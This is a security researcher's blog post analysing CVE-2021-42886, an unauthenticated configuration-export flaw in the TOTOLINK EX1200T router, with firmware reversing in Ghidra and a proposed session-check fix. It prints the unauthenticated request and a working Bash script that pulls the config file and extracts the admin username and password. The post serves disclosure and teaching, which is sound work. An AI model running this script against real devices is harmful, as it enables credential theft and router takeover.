<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>CVE-2021-42886: TOTOLINK EX1200T Information disclosure vulnerability - Zeyad Azima</title>
<meta name="description" content="Analysis for CVE-2021-42886 which is an Information disclosure vulnerability in TOTOLINK EX1200T which lead to unauthorized access to the device. ">


  <meta name="author" content="Zeyad Azima">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Zeyad Azima">
<meta property="og:title" content="CVE-2021-42886: TOTOLINK EX1200T Information disclosure vulnerability">
<meta property="og:url" content="http://localhost:5000/iot%20exploitation/CVE_2021_42886/">


  <meta property="og:description" content="Analysis for CVE-2021-42886 which is an Information disclosure vulnerability in TOTOLINK EX1200T which lead to unauthorized access to the device. ">



  <meta property="og:image" content="http://localhost:5000/assets/images/clfhkdx1o0zyi0jk82f8ugbdr.png">





  <meta property="article:published_time" content="2023-03-23T00:00:00+08:00">





  

  


<link rel="canonical" href="http://localhost:5000/iot%20exploitation/CVE_2021_42886/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Zeyad Azima",
      "url": "http://localhost:5000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zeyad Azima Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          Zeyad Azima
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Security-Research">Security Research</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#MacOS">MacOS</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#IoT-Exploitation">IoT Exploitation</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Defense-Evasion">Defense Evasion</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#General">General</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Certificates">Certificates</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site_data/avatar.jpg" alt="Zeyad Azima" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Zeyad Azima</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Brain Storming Stuff (Exploit Development, Reverse Engineering &amp; More)</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="mailto:contact@zeyadazima.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/AzimaZeyad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/zer0verflow/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/Zeyad-Azima" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/zeyadazima" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i><span class="label">Buy Me a Coffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="CVE-2021-42886: TOTOLINK EX1200T Information disclosure vulnerability">
    <meta itemprop="description" content="Introduction">
    <meta itemprop="datePublished" content="2023-03-23T00:00:00+08:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">CVE-2021-42886: TOTOLINK EX1200T Information disclosure vulnerability
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  13 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#obtaining-the-firmware">Obtaining the Firmware</a></li>
  <li><a href="#the-analysis">The Analysis</a></li>
  <li><a href="#final-thoughts">Final Thoughts</a></li>
  <li><a href="#conclusion">Conclusion</a>
    <ul>
      <li><a href="#references">References</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <h1 id="introduction"><strong>Introduction</strong></h1>

<p>A vulnerability discovered in TOTOLINK <code class="language-plaintext highlighter-rouge">EX1200T</code> model known as <code class="language-plaintext highlighter-rouge">CVE-2021-42886</code> which lead to a leak of configurations file to unauthorized user, as a results anyone exploit this vulnerability can get the user name and password of the device. Note:(<code class="language-plaintext highlighter-rouge">Everything you obtain here is for educational purposes, Don't use or abuse any bug against any target without permissions</code>)</p>

<h1 id="obtaining-the-firmware"><strong>Obtaining the Firmware</strong></h1>

<p>Before we start we would need the firmware of the device, Therefore We can take a static look at the code and how it works to understand more. So, what we need is the vulnerable Firmware for the device which is <code class="language-plaintext highlighter-rouge">V4.1.2cu.5215</code> and we have many ways to do it:</p>

<ul>
  <li>
    <p>You can search for the firmware on the official website for the vendor.</p>
  </li>
  <li>
    <p>Download it from any other source (after someone already dump it from the device and published it).</p>
  </li>
  <li>
    <p>Dump the firmware through <code class="language-plaintext highlighter-rouge">UART</code>, You could read a detailed blog from <a href="https://www.cyberark.com/resources/threat-research-blog/accessing-and-dumping-firmware-through-uart">Here</a>.</p>
  </li>
  <li>
    <p>Also, you could contact the support to provide you with the firmware.</p>
  </li>
  <li>
    <p>Finally dumping the firmware using <code class="language-plaintext highlighter-rouge">CH341A</code> Mini programmer USB, You could read a detailed blog from <a href="https://www.blackhillsinfosec.com/dumping-firmware-with-the-ch341a-programmer/">Here</a>.</p>
  </li>
</ul>

<p>In my case, I found the firmware on the vendor website. Now, Let’s extract the firmware using <code class="language-plaintext highlighter-rouge">binwalk</code> tool as the following <code class="language-plaintext highlighter-rouge">binwalk -e --run-as=root "TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web"</code> and here is the output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls
TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web
$ sudo binwalk -e --run-as=root "TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web"
[sudo] password for azima:

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
76            0x4C            JFFS2 filesystem, little endian
209052        0x3309C         Zlib compressed data, compressed
209388        0x331EC         Zlib compressed data, compressed
210144        0x334E0         Zlib compressed data, compressed
210832        0x33790         JFFS2 filesystem, little endian
231428        0x38804         Zlib compressed data, compressed
231988        0x38A34         Zlib compressed data, compressed
232548        0x38C64         Zlib compressed data, compressed
233116        0x38E9C         Zlib compressed data, compressed
233560        0x39058         JFFS2 filesystem, little endian
254344        0x3E188         Zlib compressed data, compressed
254696        0x3E2E8         JFFS2 filesystem, little endian
255224        0x3E4F8         Zlib compressed data, compressed
256064        0x3E840         JFFS2 filesystem, little endian
321636        0x4E864         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 6526520 bytes
</code></pre></div></div>

<p>And as i am using <code class="language-plaintext highlighter-rouge">Windows Subsystem Linux (WSL)</code>, Here we can browser our firmware normally:</p>

<p><img src="/assets/images/7ccaa7cd1d7121ea95a18679ba74376b" alt="" /></p>

<h1 id="the-analysis"><strong>The Analysis</strong></h1>

<p>When we first open the <code class="language-plaintext highlighter-rouge">/cgi-bin</code> directory under the <code class="language-plaintext highlighter-rouge">web_cste</code> folder we can see the following <code class="language-plaintext highlighter-rouge">shell</code> files:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ExportIbmsConfig.sh
ExportSettings.sh
ExportSyslog.sh
</code></pre></div></div>

<p>The file we want to take a look at is <code class="language-plaintext highlighter-rouge">ExportSettings.sh</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh

#output HTTP header
eval `flash get HARDWARE_MODEL`
dateStr=`date  '+%Y%m%d'`
filename=\"Config-$HARDWARE_MODEL-$dateStr.dat\"

echo "Pragma: no-cache\n"
echo "Cache-control: no-cache\n"
echo "Content-type: application/octet-stream"
echo "Content-Transfer-Encoding: binary"                        #  "\n" make Un*x happy
echo "Content-Disposition: attachment; $filename"
echo ""

cat /var/config.dat 2&gt;/dev/null
</code></pre></div></div>

<p>the <code class="language-plaintext highlighter-rouge">flash</code> command to get the value of the <code class="language-plaintext highlighter-rouge">HARDWARE_MODEL</code> environment variable and then uses the <code class="language-plaintext highlighter-rouge">eval</code> command to set that value as a shell variable, <code class="language-plaintext highlighter-rouge">dateStr</code> is a variable to the current date in the format <code class="language-plaintext highlighter-rouge">YYYYMMDD</code>, <code class="language-plaintext highlighter-rouge">filename</code> is a variable to a string that includes the hardware model and date in the format <code class="language-plaintext highlighter-rouge">Config-HARDWARE_MODEL-YYYYMMDD.dat.</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "Pragma: no-cache\n"
echo "Cache-control: no-cache\n"
echo "Content-type: application/octet-stream"
echo "Content-Transfer-Encoding: binary"
echo "Content-Disposition: attachment; $filename"
echo ""
</code></pre></div></div>

<p>The above lines are output of the HTTP headers for the response, They set various headers like <code class="language-plaintext highlighter-rouge">Pragma</code>, <code class="language-plaintext highlighter-rouge">Cache-control</code>, <code class="language-plaintext highlighter-rouge">Content-type</code>, <code class="language-plaintext highlighter-rouge">Content-Transfer-Encoding</code>, and <code class="language-plaintext highlighter-rouge">Content-Disposition</code> with the <code class="language-plaintext highlighter-rouge">filename</code> set to the <code class="language-plaintext highlighter-rouge">filename</code> variable defined before. As we can see it’s obvious that the file is used to extract the current device settings &amp; configurations, Which contains the <code class="language-plaintext highlighter-rouge">Username</code> &amp; <code class="language-plaintext highlighter-rouge">Password</code>. Now, Let’s go to <code class="language-plaintext highlighter-rouge">Burp Suite</code> and request the file <code class="language-plaintext highlighter-rouge">/cgi-bin/ExportSettings.sh</code>:</p>

<p><img src="/assets/images/7d3d6064e6a81fbc8184b1b976624f3b" alt="" /></p>

<p>As we ca see in the screenshot of, When we requested the file, It response us back with the same headers which contains the <code class="language-plaintext highlighter-rouge">.dat</code> file name.</p>

<p><img src="/assets/images/f393eacb1619835f468c4d912c5053cc" alt="" /></p>

<p>When we request the file it will show us a redirect status (<code class="language-plaintext highlighter-rouge">302</code>code) and when we follow the redirect it will show us that the file is not found. Now, If we navigate to the admin panel and go to <code class="language-plaintext highlighter-rouge">system configuration</code> tab to export configuration it will work. As we have the requests of the process in <code class="language-plaintext highlighter-rouge">Burp Suite</code>, We can notice the following request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /cgi-bin/cstecgi.cgi?action=save&amp;setting HTTP/1.1
Host: 192.168.0.254
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Connection: close
Cache-Control: max-age=0
</code></pre></div></div>

<p>The request doesn’t need any authentication or authorization or even check for the session when you request it. So, basically when you request this link it will generate the configuration file and you can download it. Let’s take a look on how this file get generated. Let’s go with <code class="language-plaintext highlighter-rouge">Ghidra</code> and reverse the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> file. Now, By going to the file and check it with the <code class="language-plaintext highlighter-rouge">file</code> command, We can see it’s an <code class="language-plaintext highlighter-rouge">ELF 32bit MIPS</code> file:</p>

<p><img src="/assets/images/76c9c3315f50847ba45103971a82d8c0" alt="" /></p>

<p>Open it and create a new project i named it <code class="language-plaintext highlighter-rouge">EX1200T</code> for the device name and drop the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> file into the project:</p>

<p><img src="/assets/images/c582d432e818c1dc4ddb99348c5f9649" alt="" /></p>

<p>After that open the file using <code class="language-plaintext highlighter-rouge">Code Browser</code> within <code class="language-plaintext highlighter-rouge">Ghidra</code>:</p>

<p><img src="/assets/images/b8f5680c3cbdf2754c4138e2e24d21f0" alt="" /></p>

<p>Then, analysis the file:</p>

<p><img src="/assets/images/050532f3045fbae098e1a29e74708a8c" alt="" /></p>

<p>Navigating to <code class="language-plaintext highlighter-rouge">Symbol Tree</code> and let’s check out the functions:</p>

<p><img src="/assets/images/0155127a3a6dc4f44126641d5e4473a1" alt="" /></p>

<p>After going through the functions clearly inside <code class="language-plaintext highlighter-rouge">FUN_00400dd8</code> function we can see the following lines of codes. But, there is no thing interesting and it’s all about functions calling other functions:</p>

<p><img src="/assets/images/1f8ae17c2ca4b0847e09449ae23395b2" alt="" /></p>

<p>We just can see that <code class="language-plaintext highlighter-rouge">httpStatus</code>, <code class="language-plaintext highlighter-rouge">redirectURL</code> &amp; <code class="language-plaintext highlighter-rouge">responseParam</code> being passed to some unclear functions. But, You can see under <code class="language-plaintext highlighter-rouge">\squashfs-root\lib\cste_modules</code> folder that there are libraries named as the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app.so
cloudupdate.so
global.so
lan.so
product.so
system.so
upgrade.so
wireless.so
wps.so
</code></pre></div></div>

<p>After reversing this libraries you will know that it’s clearly used by the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> to perform different operations and changes through the device panel. Let’s identify which one perform the export for the configuration process by searching through the following <code class="language-plaintext highlighter-rouge">Bash</code> one liner using <code class="language-plaintext highlighter-rouge">strings</code> command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for i in $(ls -la | awk '{print $9}' | grep ".so"); do echo ""; echo "Lib Name: $i"; strings $i | grep "Config"; done
</code></pre></div></div>

<p>The above line will print the library name after this will run the <code class="language-plaintext highlighter-rouge">strings</code> command on the library to get any string has the word <code class="language-plaintext highlighter-rouge">Config</code> and will print the results under the library name. Therefore, we will be able to know which library contains the <code class="language-plaintext highlighter-rouge">Config</code> process or anything related. Command output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Lib Name: app.so
getAppStatusConfig
getAppEasyWizardConfig
setAppEasyWizardConfig
getAppWanConfig
setAppWanConfig
getAppWiFiConfig
setAppWiFiConfig
getAppMultiApConfig
setAppMultiApConfig
'getAppStatusConfig
getAppEasyWizardConfig
setAppEasyWizardConfig
getAppWanConfig
setAppWanConfig
getAppWiFiConfig
setAppWiFiConfig
getAppMultiApConfig
setAppMultiApConfig

Lib Name: cloudupdate.so

Lib Name: global.so
getSaveConfig
getInitConfig
setWanDnsConfig
getSaveConfig
getInitConfig
cp /web_cste/config.dat /web_cste/Config-%s-%s.dat
,"redirectURL":"http://%s/Config-%s-%s.dat"}

Lib Name: lan.so
setLanConfig
getLanConfig
setStaticDhcpConfig
delStaticDhcpConfig
getStaticDhcpConfig
'setLanConfig
getLanConfig
setStaticDhcpConfig
delStaticDhcpConfig
getStaticDhcpConfig

Lib Name: product.so

Lib Name: system.so
getMiniUPnPConfig
setMiniUPnPConfig
getMiniUPnPConfig
setMiniUPnPConfig

Lib Name: upgrade.so
MM_ConfigFileInvalid
MM_ConfigSizeErr
MM_ConfigFileErr

Lib Name: wireless.so
setWiFiBasicConfig
getWiFiBasicConfig
setWiFiAdvancedConfig
getWiFiAdvancedConfig
setWiFiMultipleConfig
getWiFiMultipleConfig
delWiFiMultipleConfig
getWiFiAclAddConfig
setWiFiAclAddConfig
setWiFiAclDeleteConfig
getWiFiWdsAddConfig
setWiFiWdsAddConfig
setWiFiWdsDeleteConfig
getWiFiRepeaterConfig
setWiFiRepeaterConfig
getWiFiScheduleConfig
setWiFiScheduleConfig
getWiFiApConfig
setWiFiApConfig
getWiFiExtenderConfig
setWiFiExtenderConfig
setWiFiBasicConfig
getWiFiBasicConfig
setWiFiAdvancedConfig
getWiFiAdvancedConfig
setWiFiMultipleConfig
getWiFiMultipleConfig
delWiFiMultipleConfig
getWiFiAclAddConfig
setWiFiAclAddConfig
setWiFiAclDeleteConfig
getWiFiWdsAddConfig
setWiFiWdsAddConfig
setWiFiWdsDeleteConfig
getWiFiRepeaterConfig
setWiFiRepeaterConfig
getWiFiScheduleConfig
setWiFiScheduleConfig
getWiFiApConfig
setWiFiApConfig
getWiFiExtenderConfig
setWiFiExtenderConfig

Lib Name: wps.so
setWiFiWpsConfig
getWiFiWpsConfig
getWiFiWpsSetupConfig
setWiFiWpsSetupConfig
setWiFiWpsConfig
getWiFiWpsConfig
getWiFiWpsSetupConfig
setWiFiWpsSetupConfig
</code></pre></div></div>

<p>And as we can see that there are tons of it’s with-in the libraries and after a lot of search i found it under the <code class="language-plaintext highlighter-rouge">global.so</code> library, As we did with the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> file. Let’s do the same with the library using <code class="language-plaintext highlighter-rouge">Ghidra</code>. After opening the <code class="language-plaintext highlighter-rouge">Functions</code> tab under <code class="language-plaintext highlighter-rouge">Symbol Tree</code> we can notice the <code class="language-plaintext highlighter-rouge">getSaveConfig</code> function:</p>

<p><img src="/assets/images/6b78d51b1c5a7dcf96288640e37818ac" alt="" /></p>

<p>So, We can say the save configuration process is as the following:</p>

<p><img src="/assets/images/6d270eef7c01b0a0d7515cb630a5a0cb" alt="" /></p>

<p>Now, Let’s navigate to the function and understand what this function do and how it works. First the function start by taking 3 parameters:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>undefined4 getSaveConfig(undefined4 param_1,undefined4 param_2,undefined4 param_3)
</code></pre></div></div>

<p>After that the rest of the code is declaring of variables until we reach the line number <code class="language-plaintext highlighter-rouge">65</code>:</p>

<p><img src="/assets/images/da1ab11a5f03781e2e8e34ddc0f85186" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">save_cs_to_file();</code> is a call for external function and then <strong>__src</strong> which storing the value retrieved with <code class="language-plaintext highlighter-rouge">http_host</code> from the http request and the <code class="language-plaintext highlighter-rouge">""</code> value will be used if the requested variable is not found which refers to the device hostname/ip, After that there is an <code class="language-plaintext highlighter-rouge">IF</code> condition which checks if the first character of <code class="language-plaintext highlighter-rouge">__src</code> is null character or no, If that true it will call a function named <code class="language-plaintext highlighter-rouge">getLanIp()</code> and from it’s name we can guess it’s getting the IP address for the device <code class="language-plaintext highlighter-rouge">NIC</code>. Everything is clear it checks for the <code class="language-plaintext highlighter-rouge">Hostname or IP</code>. Finally, if it’s not empty then it will copy the <code class="language-plaintext highlighter-rouge">__src</code> value to the <code class="language-plaintext highlighter-rouge">local_c8</code> which also could be a hostname. Now, let’s rename the variables as we know it’s usage. Moving to the following lines:</p>

<p><img src="/assets/images/2a43818a41e371095de48751e3eb8017" alt="" /></p>

<p>Here, It assigns the status of request to the <code class="language-plaintext highlighter-rouge">acSTack_10C8</code> we can rename it to <code class="language-plaintext highlighter-rouge">reqResponse</code>. And the response will redirect the user. Then, It gets the length of <code class="language-plaintext highlighter-rouge">reqResponse</code> and assign it to <code class="language-plaintext highlighter-rouge">sVar1</code>. the call for the <code class="language-plaintext highlighter-rouge">apmib_get()</code> function is for retrieving a value from a data structure and storing it in the <code class="language-plaintext highlighter-rouge">local_x</code> variables. After that opens the file <code class="language-plaintext highlighter-rouge">config.dat</code> in append mode and assigns a file pointer to the variable <code class="language-plaintext highlighter-rouge">__s</code>, We can rename it to <code class="language-plaintext highlighter-rouge">configFile</code>.</p>

<p><img src="/assets/images/ea0430de921c0f7e3ef506c9bc35d735" alt="" /></p>

<p>By moving to the following lines, It checks if the file cannot be opened then it will print error massege, If the file is opened successfully, The code writes a single byte <code class="language-plaintext highlighter-rouge">DAT_0001dc0c</code> to the file,followed by the contents of the <code class="language-plaintext highlighter-rouge">local_38</code> variable.Then closing the file after this, The code then retrieves the current date using the <code class="language-plaintext highlighter-rouge">date</code> command and formats it as a string in <code class="language-plaintext highlighter-rouge">local_88</code>. Then using the <code class="language-plaintext highlighter-rouge">sprintf()</code> function to create a system command that copies the <code class="language-plaintext highlighter-rouge">config.dat</code> file to a new file named <code class="language-plaintext highlighter-rouge">Config-[local_a8]-[local_88].dat</code>, Finally the command executed using the <code class="language-plaintext highlighter-rouge">system()</code> function as it saved in <code class="language-plaintext highlighter-rouge">acStack_78</code>. Now, we understand how the file is created and as we can send the unauthorized request to create it, Let’s do it and take a look on the file.</p>

<p><img src="/assets/images/2c8c650713336acf4b07311162228a1d" alt="" /></p>

<p>Here we sent the request, you can see in the response it’s redirect to the location of the file configuration file, If we follow the request we can see the file contents:</p>

<p><img src="/assets/images/01d61bc4f02ff2b6826a87e9b6bbdeef" alt="" /></p>

<p>Now, Let’s download the file normally and extract the strings from it using <code class="language-plaintext highlighter-rouge">strings</code> command.</p>

<p><img src="/assets/images/626bb4b69ce3562450a728acf14e02da" alt="" /></p>

<p>As we can see when we run strings command we can notice the <code class="language-plaintext highlighter-rouge">!admin</code> string and below it we can notice the <code class="language-plaintext highlighter-rouge">!1337</code>. And normally it looks like the <code class="language-plaintext highlighter-rouge">admin</code> which is the user and <code class="language-plaintext highlighter-rouge">1337</code> which is the password &amp; the <code class="language-plaintext highlighter-rouge">!</code> sign coming from the file. If we take a look again by printing the line number of each string we got, You can see clearly that the username and password got the <code class="language-plaintext highlighter-rouge">6th</code> &amp; <code class="language-plaintext highlighter-rouge">7th</code> lines.</p>

<p><img src="/assets/images/a234e038f8f6a1565bfff2bdc2b2339d" alt="" /></p>

<p>Now, Let’s automate the process using <code class="language-plaintext highlighter-rouge">Bash</code> script to exploit it and print out the user name and password.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash

ip=$1
url="http://${ip}/cgi-bin/cstecgi.cgi?action=save&amp;setting"

echo "[*] Target: $ip"
echo "[+] Sending creation request...."
response=$(curl -i -X GET $url \
           -H "Host: ${ip}" \
           -H 'Accept-Encoding: gzip, deflate' \
           -H 'Accept: */*' \
           -H 'Accept-Language: en-US;q=0.9,en;q=0.8' \
           -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \
           -H 'Connection: close' \
           -H 'Cache-Control: max-age=0' \
           --max-redirs 0)
echo "[+] Creation Request Sent"
location_header=$(echo "$response" | grep -i location | awk '{print $2}' | tr -d '\r')
new_url=$(echo "$location_header")
file_name=$(echo "$location_header" | awk -F "/" '{print $4}')
if [[ ! -z "$new_url" ]]; then
echo "[+] Requesting the File......"
    response_body=$(curl -s -X GET "$new_url" \
         -H "Host: ${ip}" \
         -H 'Accept-Encoding: gzip, deflate' \
         -H 'Accept: */*' \
         -H 'Accept-Language: en-US;q=0.9,en;q=0.8' \
         -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \
         -H 'Connection: close' \
         -H 'Cache-Control: max-age=0')
echo "[+] File Requested"
echo "$response_body" &gt;&gt; $file_name
echo "[+] File saved to $file_name"
echo "[*] Username and Password:"
echo "$response_body" | strings | sed -n '6,7p' | sed 's/\!//g'
fi
</code></pre></div></div>

<p>Basically, Our script will take a target as an argument and then send the creation request of the configuration file, After that it will take the value of <code class="language-plaintext highlighter-rouge">Location</code> header to <code class="language-plaintext highlighter-rouge">location_header</code> and save it to <code class="language-plaintext highlighter-rouge">new_url</code>. The, Cut the url in the <code class="language-plaintext highlighter-rouge">Location</code> header which is the configuration file url and take the file name &amp; save it to <code class="language-plaintext highlighter-rouge">file_name</code> variable, Finally, It sends the request to the file url and save it to the file name on the disk and filter out the username and password. Now, It’s the time to use it:</p>

<p><img src="/assets/images/418336f26d58b248154a6f1ab2abb122" alt="" /></p>

<h1 id="final-thoughts"><strong>Final Thoughts</strong></h1>

<p>The developer shall always check for the user session before performing any kinds of request and if the user’s session is valid or no, Another thing is to delete the configuration file from the web directory as it will be open for anyone to download it. So, the final code can be as the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Host = (char *)websGetVar(param_2,"http_host","");
  if (*Host == '\0') {
    getLanIp(&amp;deviceIP);
  }
  else {
    strcpy((char *)&amp;deviceIP,Host);
  }
  
  snprintf(reqResponse,0x1000,"{\"httpStatus\":\"%s\",\"host\":\"%s\"","302",(char *)&amp;deviceIP);
  sVar1 = strlen(reqResponse);
  apmib_get(0x4655,&amp;local_a8);
  apmib_get(0x1bbe,&amp;local_38);
if (userSession){  
    __s = fopen("/web_cste/config.dat","ab");
      if (__s == (FILE *)0x0) {
        perror("fopen");
        uVar2 = 0;
      }
      else {
        fwrite(&amp;DAT_0001dc0c,1,1,__s);
        __size = strlen((char *)&amp;local_38);
        fwrite(&amp;local_38,__size,1,__s);
        fclose(__s);
        getCmdStr("date  \'+%Y%m%d\'",&amp;local_88,0x10);
        sprintf(acStack_78,"cp /web_cste/config.dat /web_cste/Config-%s-%s.dat",(char *)&amp;local_a8,
                (char *)&amp;local_88);
        system(acStack_78);
        snprintf(reqResponse + sVar1,0x1000 - sVar1,",\"redirectURL\":\"http://%s/Config-%s-%s.dat\"}",
                 (char *)&amp;deviceIP,(char *)&amp;local_a8,(char *)&amp;local_88);
        uVar2 = websGetCfgResponse(param_1,param_3,reqResponse);
      }
  return uVar2;
} else {
    exit(1);
 }
}
</code></pre></div></div>

<p>Now, it will check for the user session if it’s valid it will complete in creating the file and send back a valid response to the user, If not then it will exit the function.</p>

<h1 id="conclusion"><strong>Conclusion</strong></h1>

<p>We have seen the analysis for the <code class="language-plaintext highlighter-rouge">CVE-2021-42886</code>, How the configurations file is created for the user to save as a backup, The importance of using encryption method to prove the confidentiality of the data and highlighted the mistakes made by the developer.</p>

<h2 id="references"><strong>References</strong></h2>

<ul>
  <li>
    <p><a href="https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html">https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html</a></p>
  </li>
  <li>
